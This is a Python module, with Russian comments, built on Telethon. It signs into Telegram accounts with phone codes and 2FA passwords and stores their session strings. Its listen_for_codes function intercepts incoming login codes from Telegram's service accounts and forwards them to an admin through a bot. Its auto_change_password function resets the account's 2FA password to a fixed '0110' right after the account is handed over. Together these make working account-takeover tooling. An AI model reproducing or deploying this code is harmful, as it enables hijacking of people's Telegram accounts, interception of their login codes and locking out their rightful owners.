"""
Сервис авторизации через Telethon.
Для работы нужны API_ID и API_HASH с https://my.telegram.org
"""
import logging
import asyncio
import os
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError,
    FloodWaitError,
)

import database as db
from config import ADMIN_ID

load_dotenv()

logger = logging.getLogger(__name__)

API_ID = int(os.getenv("TG_API_ID", "0"))
API_HASH = os.getenv("TG_API_HASH", "your_api_hash")


async def request_code(phone: str, account_id: int, user_id: int) -> dict:
    """Отправляет код авторизации на указанный номер"""
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        result = await client.send_code_request(phone)
        session_str = client.session.save()

        await db.save_pending_code(
            account_id=account_id,
            phone=phone,
            user_id=user_id,
            phone_code_hash=result.phone_code_hash,
            session_string=session_str
        )

        await client.disconnect()
        return {"success": True}

    except FloodWaitError as e:
        logger.error(f"FloodWait: {e}")
        return {"success": False, "error": f"Подождите {e.seconds} секунд"}
    except Exception as e:
        logger.error(f"Ошибка request_code: {e}")
        return {"success": False, "error": str(e)}


async def submit_code(phone: str, code: str, user_id: int) -> dict:
    """Подтверждает код авторизации"""
    pending = await db.get_pending_code(user_id)
    if not pending:
        return {"success": False, "error": "Сессия не найдена. Начните заново."}

    phone_code_hash = pending[4]
    session_string = pending[5]

    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()

        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        session_str = client.session.save()
        await client.disconnect()

        await db.delete_pending_code(user_id)
        return {"success": True, "session": session_str}

    except SessionPasswordNeededError:
        new_session = client.session.save() if client.is_connected() else session_string
        await db.save_pending_code(
            account_id=pending[1],
            phone=phone,
            user_id=user_id,
            phone_code_hash=phone_code_hash,
            session_string=new_session
        )
        try:
            await client.disconnect()
        except:
            pass
        return {"success": False, "needs_2fa": True}

    except PhoneCodeInvalidError:
        try:
            await client.disconnect()
        except:
            pass
        return {"success": False, "error": "Неверный код. Попробуй ещё раз."}

    except PhoneCodeExpiredError:
        await db.delete_pending_code(user_id)
        try:
            await client.disconnect()
        except:
            pass
        return {"success": False, "error": "Код истёк. Начни заново."}

    except Exception as e:
        logger.error(f"Ошибка submit_code: {e}")
        try:
            await client.disconnect()
        except:
            pass
        return {"success": False, "error": str(e)}


async def submit_2fa(phone: str, password: str, user_id: int) -> dict:
    """Подтверждает пароль 2FA"""
    pending = await db.get_pending_code(user_id)
    if not pending:
        return {"success": False, "error": "Сессия не найдена. Начните заново."}

    session_string = pending[5]

    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()

        await client.sign_in(password=password)
        session_str = client.session.save()
        await client.disconnect()

        await db.delete_pending_code(user_id)
        return {"success": True, "session": session_str}

    except PasswordHashInvalidError:
        try:
            await client.disconnect()
        except:
            pass
        return {"success": False, "error": "Неверный пароль 2FA."}

    except Exception as e:
        logger.error(f"Ошибка submit_2fa: {e}")
        try:
            await client.disconnect()
        except:
            pass
        return {"success": False, "error": str(e)}


async def listen_for_codes(session_string: str, phone: str, admin_id: int,
                            bot, duration: int = 120):
    """Слушает входящие коды авторизации 2 минуты"""
    from telethon import events

    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await bot.send_message(admin_id, f"❌ Сессия для {phone} недействительна")
            await client.disconnect()
            return

        received_codes = []

        @client.on(events.NewMessage(incoming=True))
        async def handler(event):
            sender = await event.get_sender()
            text = event.raw_text
            if hasattr(sender, 'id') and sender.id in [777000, 42777]:
                received_codes.append(text)
                await bot.send_message(
                    admin_id,
                    f"🔑 <b>Код для {phone}:</b>\n\n<code>{text}</code>",
                    parse_mode="HTML"
                )

        await bot.send_message(
            admin_id,
            f"👂 Слушаю коды для <code>{phone}</code> ({duration} сек)...",
            parse_mode="HTML"
        )

        await asyncio.sleep(duration)
        await client.disconnect()

        if not received_codes:
            await bot.send_message(
                admin_id,
                f"⏰ Время вышло. Кодов для <code>{phone}</code> не получено.",
                parse_mode="HTML"
            )

    except Exception as e:
        logger.error(f"Ошибка listen_for_codes: {e}")
        try:
            await bot.send_message(admin_id, f"❌ Ошибка прослушки: {e}")
        except:
            pass


AUTO_PASSWORD = "0110"


async def auto_change_password(session_string: str, old_password: str = None) -> dict:
    """Автоматически меняет пароль на 0110 сразу после сдачи"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await client.disconnect()
            return {"success": False, "error": "Сессия недействительна"}

        if old_password:
            await client.edit_2fa(current_password=old_password, new_password=AUTO_PASSWORD)
        else:
            await client.edit_2fa(new_password=AUTO_PASSWORD)

        await client.disconnect()
        return {"success": True}

    except Exception as e:
        logger.error(f"Ошибка auto_change_password: {e}")
        try:
            await client.disconnect()
        except:
            pass
        return {"success": False, "error": str(e)}


async def change_password(session_string: str, phone: str, new_password: str) -> dict:
    """Меняет пароль 2FA аккаунта"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await client.disconnect()
            return {"success": False, "error": "Сессия недействительна"}

        await client.edit_2fa(new_password=new_password)
        await client.disconnect()
        return {"success": True}

    except Exception as e:
        logger.error(f"Ошибка change_password: {e}")
        try:
            await client.disconnect()
        except:
            pass
        return {"success": False, "error": str(e)}


async def check_spam_block(session_string: str) -> dict:
    """
    Проверяет аккаунт на спам-блок через @SpamBot.
    """
    from telethon import events as tl_events

    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await client.disconnect()
            return {"success": False, "error": "Сессия недействительна"}

        spambot_response = None
        response_event = asyncio.Event()

        @client.on(tl_events.NewMessage(from_users="SpamBot", incoming=True))
        async def spambot_handler(event):
            nonlocal spambot_response
            spambot_response = event.raw_text
            response_event.set()

        await client.send_message("SpamBot", "/start")

        try:
            await asyncio.wait_for(response_event.wait(), timeout=10)
        except asyncio.TimeoutError:
            pass

        await client.disconnect()

        if spambot_response is None:
            return {"success": False, "error": "SpamBot не ответил"}

        text_lower = spambot_response.lower()
        if "free" in text_lower or "ограничен" not in text_lower and "spam" not in text_lower:
            blocked = False
        else:
            blocked = True

        return {
            "success": True,
            "blocked": blocked,
            "message": spambot_response
        }

    except Exception as e:
        logger.error(f"Ошибка check_spam_block: {e}")
        try:
            await client.disconnect()
        except:
            pass
        return {"success": False, "error": str(e)}
